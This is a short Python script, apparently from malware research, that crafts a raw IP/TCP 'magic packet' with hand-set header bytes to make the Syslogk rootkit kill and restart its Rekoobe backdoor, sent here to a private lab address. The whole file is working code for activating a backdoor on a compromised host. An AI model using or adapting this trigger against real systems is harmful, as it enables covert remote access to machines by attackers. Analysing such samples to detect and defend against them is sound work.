#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""Syslogk magic packet for starting Rekoobe
   (it first kills all running instances of Rekoobe)
"""

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

ip_header  = b'\x45\x00\xB3\xF7'  # Version, IHL, Type of Service | Total Length
ip_header += b'\xb6\xe7\x00\x00'  # Identification | Flags, Fragment Offset
ip_header += b'\x40\x06\xa6\xec'  # TTL, Protocol | Header Checksum
ip_header += b'\x0a\x00\x02\x0E'  # Source Address
ip_header += b'\x0a\x00\x02\x0F'  # Destination Address

tcp_header  = b'\xB6\xE7\x00\x00' # Source Port | Destination Port
tcp_header += b'\x00\x00\x00\x00' # Sequence Number
tcp_header += b'\x00\x00\x00\x00' # Acknowledgement Number
tcp_header += b'\x50\x02\x71\x10' # Data Offset, Reserved, Flags | Window Size
tcp_header += b'\xe6\x32\x00\x00' # Checksum | Urgent Pointer

packet = ip_header + tcp_header
s.sendto(packet, ('10.0.2.15', 1))
